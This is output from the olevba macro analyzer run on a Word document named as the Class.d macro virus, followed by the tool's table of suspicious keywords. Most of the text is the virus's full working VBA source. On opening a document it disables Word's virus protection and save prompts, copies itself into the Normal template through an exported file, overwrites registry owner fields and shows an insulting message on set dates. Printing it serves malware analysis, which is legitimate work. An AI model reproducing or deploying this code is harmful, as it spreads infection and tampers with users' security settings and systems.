olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-952e3477e5a9231e12064652835173968f2dec3f9555a515a8274cbd93aab8f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-952e3477e5a9231e12064652835173968f2dec3f9555a515a8274cbd93aab8f2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Const REG_SZ As Long = 1
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Const HKEY_CURRENT_USER As Long = &H80000001
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Sub AutoOpen()
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
On Error GoTo out
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Options.VirusProtection = False
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Options.SaveNormalPrompt = False
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Options.ConfirmConversions = False
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
If nt > 70 And ad > 0 Then GoTo out
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
If nt < 70 Then
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
End If
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
host.codemodule.AddFromFile ("c:\class.sys")
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
With host.codemodule
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    For x = 1 To 16
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    .deletelines 1
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    Next x
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
End With
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
If nt < 70 Then
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    With host.codemodule
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    .replaceline 1, "Sub AutoClose()"
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    .replaceline 91, "Sub ToolsMacro()"
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    For x = 70 To 81
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
        .deletelines 62
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    Next x
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    .replaceline 35, "    For x = 1 To 4"
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    End With
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
End If
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
If nt < 70 Then
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
u = RegCloseKey(k)
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
End If
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
With host.codemodule
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    For x = 2 To 104 Step 2
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
    Next x
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
End With
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
out:
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
End Sub
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
Sub ViewVBCode()
'C44/14/99 12:15:36 PMHP LaserJet 4 on LPT1:A-48
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

